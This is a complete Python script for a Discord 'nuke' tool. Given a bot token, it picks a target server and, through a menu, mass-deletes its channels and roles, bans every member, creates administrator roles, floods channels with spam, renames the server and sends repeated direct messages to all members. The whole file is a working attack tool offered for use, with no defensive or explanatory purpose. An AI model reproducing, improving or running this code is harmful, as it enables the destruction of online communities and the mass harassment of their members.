#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import random
import asyncio
import discord
from discord.ext import commands
from colorama import init, Fore, Style
import concurrent.futures

init(autoreset=True)

RED = Fore.RED + Style.BRIGHT
RESET = Style.RESET_ALL

LOGO = f"""
{RED}
██████╗  ██████╗ ███████╗███████╗
╚════██╗██╔═████╗██╔════╝██╔════╝
 █████╔╝██║██╔██║███████╗███████╗
 ╚═══██╗████╔╝██║╚════██║╚════██║
██████╔╝╚██████╔╝███████║███████║
╚═════╝  ╚═════╝ ╚══════╝╚══════╝{RESET}
"""

BANNER = f"""
{RED}╔══════════════════════════════════════╗
{RED}║        ULTIMATE NUKE ENGINE        ║
{RED}║        PROGRAMMED BY 3ZF           ║
{RED}╚══════════════════════════════════════╝{RESET}
"""

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def show_banner(user=None):
    clear_screen()
    print(LOGO)
    print(BANNER)
    if user:
        print(f"{RED}[+] LOGGED IN AS: {user}{RESET}")

show_banner()
TOKEN = input(f"{RED}> ENTER TOKEN: {RESET}").strip()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

selected_guild = None
running = True
semaphore = asyncio.Semaphore(500)

@bot.event
async def on_ready():
    global selected_guild
    show_banner(bot.user.name)
    servers = sorted(list(bot.guilds), key=lambda x: x.member_count, reverse=True)
    print(f"\n{RED}SERVERS ({len(servers)}):{RESET}")
    for i, s in enumerate(servers):
        print(f"  {RED}{i+1}. {s.name[:20]:<20} (MEMBERS: {s.member_count}){RESET}")
    while True:
        try:
            idx = int(input(f"\n{RED}> CHOOSE SERVER NUMBER: {RESET}")) - 1
            if 0 <= idx < len(servers):
                selected_guild = servers[idx]
                break
        except ValueError:
            pass
        print(f"{RED}[-] INVALID NUMBER{RESET}")
    print(f"\n{RED}[+] TARGET: {selected_guild.name}{RESET}")
    await main_menu()

async def main_menu():
    global running
    while running:
        print(f"\n{RED}┌─────────────────────────────────────────────────────────────┐")
        print(f"{RED}│ [1] DELETE CHANNELS   |   [2] DELETE ROLES     │")
        print(f"{RED}│ [3] BAN MEMBERS       |   [4] CREATE CHANNELS  │")
        print(f"{RED}│ [5] CREATE ADMIN ROLES|   [6] SPAM MESSAGES    │")
        print(f"{RED}│ [7] CHANGE SERVER NAME|   [8] DM ALL MEMBERS   │")
        print(f"{RED}│ [9] EXIT                                        │")
        print(f"{RED}└─────────────────────────────────────────────────────────────┘")
        print(f"\n{RED}            PROGRAMMED BY 3ZF{RESET}")
        choice = input(f"\n{RED}> CHOOSE OPTION: {RESET}").strip()
        if choice == "1": await delete_channels()
        elif choice == "2": await delete_roles()
        elif choice == "3": await ban_members()
        elif choice == "4": await create_channels()
        elif choice == "5": await create_roles()
        elif choice == "6": await spam_messages()
        elif choice == "7": await change_server_name()
        elif choice == "8": await dm_all_members()
        elif choice == "9":
            running = False
            print(f"\n{RED}[+] EXITING...{RESET}")
            await bot.close()
            sys.exit(0)
        else:
            print(f"{RED}[-] INVALID OPTION{RESET}")

async def delete_channels():
    print(f"\n{RED}[+] DELETING ALL CHANNELS...{RESET}")
    try:
        tasks = []
        for ch in selected_guild.channels:
            tasks.append(ch.delete())
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{RED}[+] CHANNELS DELETED!{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")

async def delete_roles():
    print(f"\n{RED}[+] DELETING ALL ROLES...{RESET}")
    try:
        roles = [r for r in selected_guild.roles if r.name != "@everyone"]
        tasks = []
        for r in roles:
            tasks.append(r.delete())
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{RED}[+] ROLES DELETED!{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")

async def ban_members():
    confirm = input(f"{RED}> BAN ALL MEMBERS? (YES/NO): {RESET}").lower()
    if confirm != "yes":
        print(f"{RED}[-] CANCELLED{RESET}")
        return
    print(f"\n{RED}[+] BANNING MEMBERS...{RESET}")
    try:
        members = [m for m in selected_guild.members if m.id != bot.user.id and not m.bot]
        if not members:
            print(f"{RED}[-] NO MEMBERS TO BAN{RESET}")
            return
        tasks = []
        for m in members:
            tasks.append(m.ban(reason="NUKE"))
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{RED}[+] {len(members)} MEMBERS BANNED!{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")

async def create_channels():
    try:
        count = int(input(f"{RED}> HOW MANY CHANNELS?: {RESET}"))
        if count <= 0:
            print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
            return
    except ValueError:
        print(f"{RED}[-] ENTER A NUMBER{RESET}")
        return
    
    print(f"\n{RED}[+] ENTER CHANNEL NAMES (TYPE 'DONE' TO FINISH):{RESET}")
    names = []
    while len(names) < count:
        name = input(f"{RED}> NAME {len(names)+1}: {RESET}").strip()
        if name.upper() == "DONE":
            break
        if name:
            names.append(name)
    
    if not names:
        print(f"{RED}[-] NO NAMES ENTERED{RESET}")
        return
    
    print(f"\n{RED}[+] CREATING {len(names)} CHANNELS...{RESET}")
    try:
        tasks = []
        for name in names:
            tasks.append(selected_guild.create_text_channel(name))
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{RED}[+] {len(names)} CHANNELS CREATED!{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")

async def create_roles():
    try:
        count = int(input(f"{RED}> HOW MANY ROLES?: {RESET}"))
        if count <= 0:
            print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
            return
    except ValueError:
        print(f"{RED}[-] ENTER A NUMBER{RESET}")
        return
    
    print(f"\n{RED}[+] ENTER ROLE NAMES (TYPE 'DONE' TO FINISH):{RESET}")
    names = []
    while len(names) < count:
        name = input(f"{RED}> NAME {len(names)+1}: {RESET}").strip()
        if name.upper() == "DONE":
            break
        if name:
            names.append(name)
    
    if not names:
        print(f"{RED}[-] NO NAMES ENTERED{RESET}")
        return
    
    print(f"\n{RED}[+] CREATING {len(names)} ADMIN ROLES...{RESET}")
    try:
        tasks = []
        for name in names:
            tasks.append(selected_guild.create_role(
                name=name,
                color=discord.Color.from_rgb(139, 0, 0),
                permissions=discord.Permissions(administrator=True)
            ))
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{RED}[+] {len(names)} ADMIN ROLES CREATED!{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")

async def spam_messages():
    try:
        count = int(input(f"{RED}> MESSAGES PER CHANNEL?: {RESET}"))
        if count <= 0:
            print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
            return
    except ValueError:
        print(f"{RED}[-] ENTER A NUMBER{RESET}")
        return
    
    msg = input(f"{RED}> MESSAGE CONTENT: {RESET}")
    if not msg:
        print(f"{RED}[-] MESSAGE CANNOT BE EMPTY{RESET}")
        return
    
    text_channels = selected_guild.text_channels
    if not text_channels:
        print(f"{RED}[-] NO TEXT CHANNELS FOUND{RESET}")
        return
    
    print(f"\n{RED}[+] SPAMMING {count} MESSAGES TO {len(text_channels)} CHANNELS...{RESET}")
    try:
        tasks = []
        for ch in text_channels:
            for _ in range(count):
                tasks.append(ch.send(msg))
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{RED}[+] SPAM COMPLETED!{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")

async def change_server_name():
    name = input(f"{RED}> NEW SERVER NAME: {RESET}")
    if not name:
        print(f"{RED}[-] NAME CANNOT BE EMPTY{RESET}")
        return
    try:
        await selected_guild.edit(name=name)
        print(f"{RED}[+] SERVER NAME CHANGED TO: {name}{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")

async def dm_all_members():
    try:
        count = int(input(f"{RED}> HOW MANY MESSAGES PER MEMBER?: {RESET}"))
        if count <= 0:
            print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
            return
    except ValueError:
        print(f"{RED}[-] ENTER A NUMBER{RESET}")
        return
    
    msg = input(f"{RED}> MESSAGE CONTENT: {RESET}")
    if not msg:
        print(f"{RED}[-] MESSAGE CANNOT BE EMPTY{RESET}")
        return
    
    members = [m for m in selected_guild.members if m.id != bot.user.id and not m.bot]
    if not members:
        print(f"{RED}[-] NO MEMBERS TO DM{RESET}")
        return
    
    print(f"\n{RED}[+] SENDING {count} DMS TO {len(members)} MEMBERS...{RESET}")
    
    try:
        tasks = []
        for member in members:
            for _ in range(count):
                tasks.append(member.send(msg))
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{RED}[+] DMS SENT SUCCESSFULLY!{RESET}")
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")

if __name__ == "__main__":
    try:
        bot.run(TOKEN, reconnect=True)
    except discord.LoginFailure:
        print(f"{RED}[-] INVALID TOKEN{RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
        sys.exit(1)
